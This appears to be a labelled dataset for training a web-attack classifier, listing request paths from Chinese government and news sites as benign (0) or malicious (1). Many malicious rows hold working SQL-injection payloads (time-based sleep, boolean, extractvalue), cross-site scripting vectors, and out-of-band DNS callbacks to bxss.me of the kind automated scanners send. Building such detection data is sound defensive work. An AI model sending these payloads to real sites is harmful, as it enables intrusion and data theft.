request	label
/**********/system/2021/10/11/013462298.shtml	0
/****/bmkx/jkzx/202110/w020211024587421962402.jpg	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5170\u6885\u9910\u5385	0
/***/0/02/03/14/2031410_936431.jpg	0
"/***/getdetail?data={""news_id"":""1264344"",""diversion_id"":"""",""sign"":""""}"	0
/****/if(now()=sysdate(),sleep(15),0)/jcgc/	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5c0f\u6768\u9992\u5934\u5e97	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u4e60\u5c97\u9547\u7ecf\u6d4e\u6865\u8089\u5e97	0
/****/zzxxgk/jjhzj/zsxm/qjsc/202101/t20210108_175923.html	0
/**/web/sa3/addholiday.do	1
"/****/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="""">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search"	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(3429)</script>?_=1630311881123"	1
/****/201909/t20190926_1757008.html	0
/**//509/f8kvl0wp/xhr_send?t=1632366085442	1
"/******/resource/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/base64.js"	1
/***/ftl/pc/easyui/themes/default/easyui.css	0
/**********/system/2020/04/14/013139713.shtml	0
/******/uploadpic/image/20190603/1559551131109274.jpg	0
/******/actionhandler/ajax_managed_services.php	1
"/****/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/ghby/gzdt.htm"	1
/**********/system/2015/12/31/011902702.shtml	0
/****/bmkx/ggjyzx/201703/t20170331_88063.html	0
/****/wlgc/	0
/****/xxgkml/qtfdxx/zcjd/szcjd/202012/w020201222361748005367.png	0
/***/mood/default/images/enorth/news_xq_ws_009.gif	0
/**/finderview/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u5174\u4ec1\u9547\u7fd4\u5b87\u5de5\u4f5c\u5ba4	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u79c0\u6885\u6c34\u679c\u5e97	0
/****/20211025/javascript:void(0);	1
/zwxx_11337/****/zcjd/202111/t20211103_3114633.html	0
/****/xydt/2014hydt/201412/'http:/leyubet1410.com/'	0
/xxgk%' and 2*3*8=6*8 and 'iywl'!='iywl%/******/list.html	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6d77\u9633\u8d38\u6613\u6709\u9650\u516c\u53f8\u5e73\u7f57\u5206\u516c\u53f8	0
/******/qhkc/mtpl/	0
/***/003/003/081/00300308162_80dd20a9.jpg	0
/***/?icl_action=reminder_popup&target=javascript:alert(777);//	1
"/***/getlist?data={""channel_id"":""12228"",""channel_type"":""4"",""page"":1,""page_size"":15}"	0
/zwxx_11337/****/202004/t20200408_2015165.html	0
/**********/system/2020/06/24/013192582.shtml	0
/****/dxzdj/201411/w020141125633483835774.jpg	0
/*******/qiye/b-e1557699.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6c38\u5eb7\u9547\u987a\u901a\u52b3\u52a1\u670d\u52a1\u90e8	0
"/***/gw_admin.php?a="""">alert(777);&t=settings"	1
"/************/template<esi:include src=""""http://bxss.me/rpb.png""""/>/jcse/110105008056111/16/images/jquery.waterfall.js"	1
/****/20210804/javascript:void(0);	1
/****/zgsdt/zgs16/index_64.html	0
"/************/search.do?begin=20200819&end=20210819&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl='""""()&%<acx><script >dgwh(9499)</script>&websiteid="	1
"/****/bysw/swsj/201610/t20161010_456.html?leader=' 'a'.concat(70-3).concat(22*4).concat(112).concat(80).concat(122).concat(81) (require'socket'
socket.gethostbyname('hitpi' 'dxnusecr6ac7c.bxss.me.')[3].to_s) '"	1
/****/index.php?title=acunetixtest29b913&action=submit	1
/********/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u5218\u6653\u8273\u670d\u88c5\u5e97	0
/**/system/2021/09/14/javascript:void(0);	1
/**********/system/2021/09/14/013451371.shtml	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u5174\u4ec1\u9547\u8302\u751f\u6469\u6258\u8f66\u884c	0
/****/zdgz/2020_zdgz/202110/gjjtwzq/	0
/******/download/down.jsp?i_id=194814&colid=72' and 8101=3962 and 'wlqe'='wlqe	1
/********/bxss.me	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u8863\u5427\u670d\u88c5\u5e97	0
/*****/system/2009/09/11/002805366.shtml	0
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
"/***/zeroclipboard/zeroclipboard.swf?id=""))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height"	1
/*****/gy42/ljcpgyview.asp?id=29350874&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u3f6d	0
/**********/system/2021/09/20/013454364.shtml	0
"/*****/server/news/show/title/""><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
/****/czgk/bmjs/sydw1/zzqwjj/202010/t20201019_2259499.html	0
/****/qzfwj/201801/t20180115_668993.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e4c\u4e91\u51b0\u6dc7\u6dcb\u5e97	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u592a\u9633\u5c71\u805a\u9999\u9e2d\u8116\u5e97	0
/****/whln/ and 1>1	1
/*****/20210809/javascript:void(0);	1
/about-southwest/information-disclosure/**/index_15.html	0
"/****/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/csjs/1.htm"	1
/***/system/2010/11/18/010235889.shtml	0
/****/zycs/201706/t20170613_280109.html	0
/***/003/004/336/00300433626_e64be315.png	0
/*******/qiye/businesses-e52063_37.html?category_id=	0
"/****/zzxxgk/tjj'""""()&%<acx><script >covi(9951)</script>/zfxxgkml_2127/jytabljg_2061/list.html"	1
/**********/system/2020/12/15/013302995.shtml	0
/***/bxss.me/t/xss.html?	1
"/***/col11/index.html/""><script>alert(5755)</script>"	1
/******/error_ches.php	1
/****/web/search?channelid=222832&searchword=\u671b\u6d2a\u5174\u65fa\u7efc\u5408\u5546\u5e97	0
/*****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/*****/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg	1
/***/0/02/10/82/2108243_277113.jpg	0
/***/0/01/39/18/1391899_785765.jpg	0
/****/images/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/*********/	0
/*****/gy48/cpgyss.asp?key=\u023c\u00fa\ufffd\u7ce7\ufffd\ufffd\u00fa\ufffd\u8c78&l=\ufffd\ufffd\ufffd\ufffd	0
/****/zzxxgk/tjj%' and 2*3*8=6*8 and 'eqem'!='eqem%/zfxxgkml_2127/hygq_2064/list.html	1
/***/index.php?c=user&a=login</textarea>--><xss_c725b4d8481a5c0b55948ada399c0e04/><!--<textarea>	1
/*****/index/detail/art_id/239.html	0
"/*****/status_captiveportal.php?zone='""><script>alert(777);</script>"	1
/*****/20200922/javascript:void(0);	1
"/****/bmkx/sfgw/201610/"""	0
/****/qzfwj/201805/t20180514_753392.html/index_1.html	0
"/************/template/jcse/' 'a'.concat(70-3).concat(22*4).concat(122).concat(69).concat(109).concat(65) (require'socket'
socket.gethostbyname('hitnp' 'sttuplrk424a2.bxss.me.')[3].to_s) '/16/images/autocomplete.css"	1
/****/zgsdt/2021_qydt/202111/kjcx/	0
/*******/201903/201903021115111009.html	0
/**********/system/more/217000000000000/0033/217000000000000_00003324.shtml	0
/****/201909/t20190926_1756594.html	0
/****/12689_3956.jspx	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u4e94\u9999\u4f9b\u9500\u793e\u6536\u8d2d\u95e8\u5e02\u90e8	0
/***/0/02/09/23/2092323_954874.jpg	0
/zwxx_11337/****/202111/t20211104_3115441_zzb.html	0
/****/zgsdt/2021_qydt/202111/t20211116_320650.html	0
/**********/system/2020/04/22/013146428.shtml	0
/****/czgk/bmjs/qtdw/zzqtycpglzx/202008/t20200812_2185118.html	0
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(1166)</script>?_=1630311769242"	1
/**/mavideo/gvideos.php?gid=1 and 1=1	1
/*******/qiye/b-e2438810.html	0
/******/public/2020/04/16/96863.images/v96863_b1587029102838_app.jpg	0
/*******/202005/202005270958581038.html	0
/****/jdt/201706/w020170720647189581883.jpg	0
/******/usercenter/index?qrcode=scanqrcode&code=06167a00054uzm1iiq000xebhp467a0a	0
/****/zzxxgk/zrzyj/zfxxgkml_2139/ghjh_1969/202109/t20210901_186232.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5b8f\u80dc\u5174\u6c7d\u914d\u7ecf\u9500\u90e8	0
/***/003/004/492/00300449234_f306ffe8.jpg	0
"/******/mydevice/index.jsp?locale=""""><script>alert(777)</script>"	1
/****/jtdt/2021_jtyw/202112/t20211214_323238.html	0
"/**/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/lib/easyui/themes/bootstrap/linkbutton.css"	1
/****/zt/ydyl/202102/t20210203_2591390.html	0
/****/q3vl8g-syxw-e109031461.html	0
"/************/search.do?category=1&cateid=40&p=1&pg=1&q=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z&tpl=16&websiteid=110105008056111"	1
/****/system/2021/02/10/013335998.shtml	0
/****/kytd/	0
"/******/resource/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/newcalendar/calendar.js"	1
/****/mtgz/2021_mtgz/202103/0'xor(if(now()=sysdate(),sleep(15),0))xor'z_271326.html	1
/******/system/2021/09/29/013458866.shtml	0
/****/0623/424872.shtml	0
/******/resource/interview/room.jsp?wbinterviewid=1033%') or 2577=4433 and '%'='&owner=1707212448	1
/****/qzfwj/5620/5642/index.html	1
/****/system/2016/04/21/javascript:dozoom(9)	1
/******/system/2021/12/21/javascript:window.print()	1
/***/admin/index.php?o=panel&a=receiver.edit&id=alert(777)	1
/***/0/10/14/77/10147784_995579.jpg	0
/****/sj1/tjxx/202001/t20200121_1929212.html	1
/****/gjys/202008/w020211214353771681885.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u5305\u5177\u4e13\u5356\u5e97	0
/*******/a123a.php	1
/**********/system/2021/09/06/013446541.shtml	0
/******/2017lh/lhkb/	0
/****/bmkx/sgsj	0
/*******/202102/202102090856441005.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6cd5\u5f8b	0
/****/qzfwj/201902/t20190219_1284107.html?from=singlemessage	0
/******/jzgrrkjm/css/main.css	0
/******/index.css	0
/**/system/2021/10/25/javascript:void(0);	1
/zwxx_11337/****/201912/t20191203_1870336.html	0
/****/dqgz/202012/t20201214_264725.html' and 'x'='x	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtfwtde3j3wa1ka6azj64vsa=&openid=ovl7jjpc1e0es8ianlgnp1ehhera&outer_str=25944&activate_ticket=fdzv9emqaffrnr3xboqhb b7f4cnbfpuj5ru x/qqqxoo8dbj5 fzedtzplsmcarob7c/bvlxukq55/htbnt/abmidj9jki2/to3w7e7qro=	0
/******//xfs.bxss.me/phone.js	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u73a9\u7269\u5f97\u5fd7	0
/****/czgk/bmyjs/zzqjcyxt/hlxrmjcy/202103/t20210309_2620222.html	0
/****/category/jishuchuangxin?page=1 and 3804=4490#	1
/******/fcarousel.js	0
"/***/col206/index.html/""""><script>alert(4678)</script>"	1
/*/210722/http://bxss.me/t/xss.html?	1
/****************/notification?access_token=79a1850a-38aa-49f8-93f9-92190a5abe02&id=undefined	0
"/******/hhs/js/jquery.kinslideshow-1.2.1.min.js/""""><script>alert(34)</script>"	1
/******/resource%' and 2*3*8=6*8 and 'rrgp'!='rrgp%/js/formfunc.js	1
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u8d75\u4e8c\u519c\u4e1a\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/'.gethostbyname(lc('hitub'.'dmiwrrny36d4b.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(83).chr(114).chr(67).'/	1
/****/czgk/bmyjs/zzqfyxt/wzszjrmfy/index_1.html	0
"/****/gccb/myjzgcsj//*/-->'""""></iframe></script></style></title></textarea><script >alert(18406)</script>"	1
/**/' and 'x'='y	1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime%') or 6685=0380	1
/zwxx_11337/****/201808/t20180809_956847.html	0
/****/system/2021/08/07/013431849.shtml	0
/***/0/01/66/02/1660259_895700.jpg	0
/***/system/2021/11/15/013480333.shtml	0
/****/gcjx/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/system/2011/08/12/010437030.shtml	0
/images'||'/***/hanweb.min.css	1
/****/system/2015/08/17/javascript:window.close();	1
/***/interface/daily_clickcount.json.jsp?callback=-1 or 9179=6545--	1
/****/system/2016/07/05/012047266.shtml	0
/******/system/2011/11/02/010514614.shtml	0
"/****/dependencies/index?search="""">alert(/777/)"	1
/**********/system/2021/12/20/013497335.shtml	0
/zwxx_11337/****/201708/t20170822_454061.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u591a\u8d62\u996d\u9986	0
/******/system/2020/04/18/013143648.shtml	0
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%') and 6385=6385	1
/***/0/02/04/57/2045701_894511.jpg	0
/zwxx_11337/****/202005/t20200515_2090351.html	0
/***/interface/comul_total.json.jsp?callback=jquery111106806594804354464_1639972904607	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u9e4f\u7a0b\u6279\u53d1\u5546\u884c	0
/******/nxrq_ysq_btnok.png	0
/****/zhengce/zfwjn/1079/1081/list.html?new=0.6383363494950316	0
/**********/system/2020/12/26/013309991.shtml	0
"/****/web/search?perpage=*/-->'""""></iframe></script></style></title></textarea><script >alert(89263)</script>"	1
"/****/qzfwj/201907/"">\u5b81\u590f\u516c\u8def\u5efa\u8bbe\u7ba1\u7406\u5c40</a>"	0
/****/xxgkml/qtfdxx/jytabl_3722/bljg/201611/t20161112_74788_wap.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u58f9\u96f6\u8f66\u884c\u4f53\u80b2\u9986\u5e97	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u5c0f\u767d\u725b\u8089\u9762\u9986	0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqzfbgt/201802/t20180223_693434.html	0
/**********/system/2020/06/07/013179689.shtml	0
/****/wp-admin/admin-post.php?page=fancybox-for-wordpress	1
/****/gjzqq/index.html?continent=%') and 0965=0965	1
/***/layui/lay/modules/layer.js?v=1640054285030	0
/****/b-e659908.html	0
"/***/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror=""alert(777)""/>"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u7855\u79d1\u4e94\u91d1\u673a\u7535\u6709\u9650\u516c\u53f8	0
/system%' and 2*3*8=6*8 and '2rxr'!='2rxr%/********/js/formfunc.js	1
/****/web/search?page=9&channelid=222832&searchword=\u9a6c\u529b&keyword=\u9a6c\u529b&perpage=20&outlinepage=10	0
/****/zt/jczwgk/gzdt/201710/t20171018_526474.html	0
/****/web/search?channelid=222832&searchword=\u6cfe\u6e90\u53bf\u76d8\u9f99\u70e7\u70e4	0
/****/rwfc/202010/t20201028_255130.html and 1=1	1
/****/bmkx/sgaj/201912/w020191210698933939249.jpg	0
/****/web/search?page=1&channelid=222832&searchword=\u5f20\u67f1&keyword=\u5f20\u67f1&perpage=20&outlinepage=10	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u91d1\u946b\u817e\u8fbe\u88c5\u9970\u6750\u6599\u5e97	0
/*****/system/2020/07/28/javascript:window.close();	1
/****/kycg/gjkj/	0
/****/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
/**********/system/2020/05/08/013156568.shtml	0
"/****/czgk/bmyjs/zzqjcyxt/znxrmjcy/\""javascript:void(0)\"""	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6b27\u65f6\u529b\u670d\u9970\u5e97	0
/**********/system/2021/12/21/013497432.shtml	0
/**********/system/2021/09/19/013453999.shtml	0
/***/0/02/08/59/2085912_275038.jpg	0
/*****/system/2014/11/24/011565268.shtml	1
/*******/qiye/b-e842697.html	0
/****/ztly/xxdj/201911/w020191122656389078972.jpg	0
/****/uswwx8-hynews-e107290570.html	0
/****/system/more/13713050000000000/0000/13713050000000000_00000008.shtml	0
/******/system/2019/10/17/javascript:window.close();	1
/******/download/downfile.jsp?classid=0&filename=f8c2ed3e25ea4c269bf2e627a90b568a.docx and 2767=5833	1
/****/jjdytpgjz/202111/t20211122_196832_wap.html	0
/******/nxslh-icon-line-right.png	0
/*****/tptt/javascript:void();	1
/***********/zaojianpinglun/?_=1640035670344	0
/****/zzxxgk/whgdj/?id=4001%' or 3082=3082 and '%%'='%	1
/****/system/2021/08/25/javascript:window.print()	1
"/***/getsubject?data={""subject_id"":213,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":3249,""sign"":""""}"	0
/**********/system/2021/09/13/013450477.shtml	0
"/************/template/jcse/110105008056111/16/"""" """"a"""".concat(70-3).concat(22*4).concat(97).concat(71).concat(98).concat(77) (require""""socket""""
socket.gethostbyname(""""hitld"""" """"rwoptjvibaac2.bxss.me."""")[3].to_s) """"/plugin/waterpull/pinterest_grid.js"	1
/******/usercenter/index?qrcode=quicklyrq,3,18459,10806	0
/*******/qiye/businesses-e44596_3.html?category_id=184558	0
/****/xxgkml/hygq_3720/rdhy/list_8.html	0
"/******/hhs/js/jquery-1.4a2.min.js/<img src=""javascript:alert(50)"">"	1
/**********/system/2020/06/21/013189846.shtml	0
"/*/doinfo/listinfo.php?mid='""""()&%<acx><script >pkza(9131)</script>"	1
/****/qzfwj/?id=5630	0
/****/201909/t20190926_1757686.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u7ecf\u6d4e\u5f00\u53d1\u533a\u5c0f\u5a1f\u9ebb\u8fa3\u70eb\u9986	0
/********/index.php?q=passwd&scope=1&title=extractvalue(1,concat(char(126),md5(1340807720)))	1
/****************/file/loadimage/?id=fafc9ad0-54cd-49dd-8ad9-4d1f8d4152c7	0
/******/system/2021/12/04/013489749.shtml	0
/**/system/2009/06/19/002759608.shtml	0
/***/0/02/11/32/2113259_746428.jpg	0
/****/xxgknb/2013/http://bxss.me/t/fit.txt.html	1
/zwxx_11337/****/201807/t20180724_925385.html	0
/****/bmkx/sgaj/201805/w020180515620112071934.jpg	0
/**/?document_srl=2670254	0
"/****/dorg/results.php?q='""--></style></script><script>alert(777)</script>&search=search&type=3"	1
/**********/system/2021/12/10/013492576.shtml	0
/**********/system/2021/12/17/013496037.shtml	0
/**/system/2021/01/15/012115506.shtml	0
/***/music_out.php?p=29'<script>alert(777)</script>	1
/****/zt/zfgzbg_1537/202102/t20210205_2593163.html	0
"/****/czgk/bmyjs/zzqjcyxt/xqqrmjcy/202103/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/****/zfxxgk/fdzdgknr/jgjj/zzjg_40895/zzqrmzfbgt/201706/t20170612_278043.html	0
"/****/czgk/bmyjs/zzqjcyxt/\""javascript:void(0)\"""	1
/**********/system/2021/12/20/013497375.shtml	0
/**********/system/2021/11/17/013481311.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u589e\u5c97\u4e61\u6c34\u6ce5\u5236\u54c1\u5382	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u9655\u5b81\u6d25\u8d27\u8fd0\u4ee3\u7406\u6709\u9650\u516c\u53f8	0
/*****/system/2015/10/06/javascript:window.close();	1
/****/mytag_js.php?aid=9999	1
/****/xxgkml/qtfdxx/zcjd/qwjd/202110/t20211012_195230.html	0
/****/xqldly/hfjtxz/201808/t20180828_108755.html	0
/*****/sys.asp	0
/*******/qiye/b-e2522951.html	0
/****/xydt/2011hydt/201412/t20141218_47199.html	0
/zwxx_11337/****/201805/t20180507_749701.html	0
/****/whs/yw_1286/202012/t20201224_2537786.html	0
/****/20211216/10917.html	0
/**********/system/2020/04/24/013148033.shtml	0
/****/ssxklzzjsx/index.shtml	0
/******/info-sericon.png	0
/****/web/search?page=2' or 5706=5706	1
/****/xxgkml/zfczyjs/bmyjs/202011/w020201111434739641452.docx	0
/***/mswpmm/common/newaccount.aspx?btncancel=alert(777)	1
/****/zghtlxgj/	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5c45\u5b89\u8857\u7ea2\u6885\u7efc\u5408\u8d85\u5e02	0
/***/mobile_h5/waparticledetail.do?article_id=202003241348161155&contenttype=article	0
/**/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/******/system/2011/04/28/010352058.shtml	0
/**/system/2021/12/09/012228688.shtml	0
/****/businesses-e32660_9.html?category_id	0
/****/jtdt/2020_jtyw/202007/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/**********/system/2021/10/20/013467329.shtml	0
/****/jtdt/jt17/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
"/***/server-session-details.jsp?hostname=""""/>alert(777)"	1
/***/003/001/770/00300177068_d2252c25.jpg	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u7267\u7ae5\u7ae5\u978b\u5e97	0
/****/gjmt/jtwxq/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/****/system/2020/12/10/012101410.shtml	0
/***/0/02/12/24/2122469_912458.png	0
/****/byszf/sz/202108/t20210806_http://bxss.me/t/xss.html?	1
"/****/"" and ""x""=""x"	1
/***********/shangpinqihuo/nongchanpin/javascript:void(0)	1
"/*/action/showinfo/?classid='""""()&%<acx><script >9wtx(9180)</script>&id=10317"	1
/zwxx_11337/****/202001/t20200115_1923033.html	0
/***/blockdata/getsearchinfo.do?&title=\u5854\u6cb3\u53bf	0
/**********/system/2021/02/06/013333629.shtml	0
/****/gjzqq/index.html?continent=' or 7230=7230	1
/zwxx_11337/****/index_8.html	0
/****/jjgz/index_3.html	0
/zwxx_11337/****/201707/w020170727657555600307.jpg	0
/**/system/2021/12/20/012231907.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u82af\u6e90\u5546\u884c	0
/*******/m0cr.php	1
/zwxx_11337/****/zcjd/202005/t20200507_2057988_zzb.html	0
"/****/category/kuaguobinggou?*/-->'""""></iframe></script></style></title></textarea><script >alert(04711)</script>=1"	1
/****/czgk/bmyjs/zzqjcyxt/hnqrmjcy/index_1.html	0
/zwxx_11337/****/ytdd/202112/w020211201577884117815.jpg	0
/**********/system/2020/07/02/013197500.shtml	0
/xwdt%' and 2*3*8=6*8 and 'ae9x'!='ae9x%/****/zjdt.htm	1
/**/mediacenter/news/201710/t20171010_175765.html	0
/***/xinwen/oeivw/3m.shtml	0
/*******/qiye/b-e1720366.html	0
/******/xzcf/wzs_33571/szbm_33572/wshjhsyj_33595/index.html	0
/****/1013/512585.shtml	0
"/****/byszx/201903/t20190319_115324.html?leader="""".gethostbyname(lc(""""hitxn"""".""""ufcffjle32f81.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(113).chr(80).chr(121).chr(70)."""""	1
